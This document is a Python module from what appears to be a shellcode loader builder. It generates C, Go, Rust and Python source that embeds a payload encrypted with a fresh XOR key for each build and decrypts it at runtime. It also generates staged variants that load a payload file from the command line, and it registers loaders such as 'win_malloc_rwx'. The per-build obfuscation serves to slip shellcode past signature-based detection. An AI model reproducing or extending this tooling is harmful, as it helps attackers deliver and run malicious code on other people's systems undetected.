"""Shared embedding helpers for loader template generation.

Deliberately thin — delegates hex formatting to formatters.to_c_array /
formatters.to_py_bytes so there is a single canonical implementation.
"""
from __future__ import annotations

import os as _os
import sys
import types

from ..formatters import to_c_array, to_py_bytes


# ---------------------------------------------------------------------------
# Plain-text embedding (kept for tests / Linux Python loaders)
# ---------------------------------------------------------------------------

def c_array_literal(data: bytes, var: str = "sc") -> str:
    """Return C unsigned char array + length constant, variable named var."""
    return to_c_array(data, var_name=var)


def python_bytes_literal(data: bytes, var: str = "sc") -> str:
    """Return Python bytes literal assignment, variable named var."""
    return to_py_bytes(data, var_name=var)


def go_bytes_literal(data: bytes, var: str = "sc") -> str:
    """Return Go []byte literal assignment, variable named var."""
    per_row = 16
    rows = []
    for i in range(0, len(data), per_row):
        chunk = data[i:i+per_row]
        rows.append("  " + ", ".join(f"0x{b:02x}" for b in chunk) + ",")
    return f"var {var} = []byte{{\n" + "\n".join(rows) + "\n}"


def rust_bytes_literal(data: bytes, var: str = "sc") -> str:
    """Return Rust &[u8] literal assignment, variable named var."""
    per_row = 16
    rows = []
    for i in range(0, len(data), per_row):
        chunk = data[i:i+per_row]
        rows.append("  " + ", ".join(f"0x{b:02x}" for b in chunk) + ",")
    return f"let {var}: &[u8] = &[\n" + "\n".join(rows) + "\n];"


# ---------------------------------------------------------------------------
# XOR helpers
# ---------------------------------------------------------------------------

def xor_key(n: int = 16) -> bytes:
    """Generate n random bytes for use as a XOR key."""
    return _os.urandom(n)


def xor_encrypt(data: bytes, key: bytes) -> bytes:
    """XOR-encrypt data with key (rolling)."""
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))


# ---------------------------------------------------------------------------
# C: encrypted embed + staged
# ---------------------------------------------------------------------------

def c_sc_block(data: bytes, sc_var: str = "sc") -> tuple[str, str]:
    """Return (global_decls, in_main_decrypt_stmt) with per-build XOR key.

    global_decls  — encrypted array + key array; place at file scope.
    decrypt_stmt  — single compound statement; call inside main() before
                    first use of sc_var.
    """
    key = xor_key()
    enc = xor_encrypt(data, key)
    kvar = f"_{sc_var}k"
    decls = (
        c_array_literal(enc, sc_var)
        + f"static unsigned char {kvar}[] = "
        + "{"
        + ", ".join(f"0x{b:02x}" for b in key)
        + "};\n"
    )
    decrypt = (
        f"{{ unsigned int _i; for (_i = 0; _i < {sc_var}_len; _i++) "
        f"{sc_var}[_i] ^= {kvar}[_i & {len(key) - 1}]; }}"
    )
    return decls, decrypt


def c_staged_sc(sc_var: str = "sc") -> tuple[str, str]:
    """Return ('', file_reading_code) for staged C.

    The file_reading_code declares sc_var and sc_var_len as local variables.
    The parent template must use int main(int argc, char *argv[]).
    """
    init = (
        f"unsigned char *{sc_var} = NULL; unsigned int {sc_var}_len = 0;\n"
        f"    if (argc < 2) {{ fputs(\"[-] usage: loader <payload.bin>\\n\", stderr); return 1; }}\n"
        f"    {{\n"
        f"        FILE *_pf = fopen(argv[1], \"rb\");\n"
        f"        if (!_pf) {{ fputs(\"[-] cannot open file\\n\", stderr); return 1; }}\n"
        f"        fseek(_pf, 0, SEEK_END); {sc_var}_len = (unsigned int)ftell(_pf); rewind(_pf);\n"
        f"        {sc_var} = (unsigned char *)malloc({sc_var}_len);\n"
        f"        if (!{sc_var}) {{ fclose(_pf); return 1; }}\n"
        f"        fread({sc_var}, 1, {sc_var}_len, _pf); fclose(_pf);\n"
        f"    }}"
    )
    return "", init


# ---------------------------------------------------------------------------
# Go: encrypted embed + staged
# ---------------------------------------------------------------------------

def go_sc_block(data: bytes, sc_var: str = "sc") -> tuple[str, str, str]:
    """Return (pkg_decls, in_main_decrypt, extra_imports) with per-build XOR key.

    pkg_decls      — place at package scope (outside main).
    decrypt        — single for-range statement; place inside main() before
                     first use of sc_var.
    extra_imports  — empty string; no additional imports needed.
    """
    key = xor_key()
    enc = xor_encrypt(data, key)
    kvar = f"_{sc_var}Key"
    decls = (
        go_bytes_literal(enc, sc_var) + "\n"
        + f"var {kvar} = []byte{{{', '.join(f'0x{b:02x}' for b in key)}}}"
    )
    decrypt = (
        f"for _i := range {sc_var} {{ {sc_var}[_i] ^= {kvar}[_i&{len(key) - 1}] }}"
    )
    return decls, decrypt, ""


def go_staged_sc(sc_var: str = "sc") -> tuple[str, str, str]:
    """Return ('', file_reading_code, extra_imports) for staged Go.

    extra_imports is '\\n\\t\"os\"' — append inside the import() block.
    """
    init = (
        f'if len(os.Args) < 2 {{ return }}\n'
        f'\t{sc_var}, _ := os.ReadFile(os.Args[1])\n'
        f'\tif len({sc_var}) == 0 {{ return }}'
    )
    return "", init, '\n\t"os"'


# ---------------------------------------------------------------------------
# Rust: encrypted embed + staged  (single in-main block)
# ---------------------------------------------------------------------------

def rust_sc_block(data: bytes, sc_var: str = "sc") -> str:
    """Return a single in-main declaration+decrypt block (mutable Vec<u8>).

    Replaces the {sc_bytes} placeholder which lives inside fn main().
    """
    key = xor_key()
    enc = xor_encrypt(data, key)
    per_row = 16
    rows = []
    for i in range(0, len(enc), per_row):
        chunk = enc[i:i+per_row]
        rows.append("    " + ", ".join(f"0x{b:02x}" for b in chunk) + ",")
    key_hex = ", ".join(f"0x{b:02x}" for b in key)
    kvar = f"_{sc_var}k"
    return (
        f"let mut {sc_var}: Vec<u8> = vec![\n"
        + "\n".join(rows)
        + "\n    ];\n"
        + f"    let {kvar}: [u8; {len(key)}] = [{key_hex}];\n"
        + f"    for _i in 0..{sc_var}.len() {{ {sc_var}[_i] ^= {kvar}[_i & {len(key) - 1}]; }}"
    )


def rust_staged_sc(sc_var: str = "sc") -> str:
    """Return file-reading code for staged Rust (in-main block)."""
    return (
        f"let args: Vec<String> = std::env::args().collect();\n"
        f"    if args.len() < 2 {{ return; }}\n"
        f"    let mut {sc_var} = std::fs::read(&args[1]).unwrap_or_default();\n"
        f"    if {sc_var}.is_empty() {{ return; }}"
    )


# ---------------------------------------------------------------------------
# Python: encrypted embed + staged  (single module-level block)
# ---------------------------------------------------------------------------

def py_sc_block(data: bytes, sc_var: str = "sc") -> str:
    """Return module-level decl + XOR decrypt for Python."""
    key = xor_key()
    enc = xor_encrypt(data, key)
    hex_str = "".join(f"\\x{b:02x}" for b in enc)
    key_str = "".join(f"\\x{b:02x}" for b in key)
    kvar = f"_{sc_var}k"
    return (
        f'{sc_var} = b"{hex_str}"\n'
        f'{kvar} = b"{key_str}"\n'
        f'{sc_var} = bytes(b ^ {kvar}[i & {len(key) - 1}] for i, b in enumerate({sc_var}))\n'
    )


def py_staged_sc(sc_var: str = "sc") -> str:
    """Return file-reading code for staged Python (module-level block)."""
    return (
        f"import sys as _sys\n"
        f"if len(_sys.argv) < 2: _sys.exit('[-] usage: loader <payload.bin>')\n"
        f"with open(_sys.argv[1], 'rb') as _pf: {sc_var} = _pf.read()\n"
    )


# ---------------------------------------------------------------------------
# Registry helper
# ---------------------------------------------------------------------------

def self_register(module_name: str, loader_name: str) -> None:
    """Register the calling module in _LOADER_REGISTRY.

    Call at module level:
        _render.self_register(__name__, "win_malloc_rwx")
    """
    from . import _LOADER_REGISTRY
    mod = sys.modules[module_name]
    _LOADER_REGISTRY[loader_name.lower()] = mod
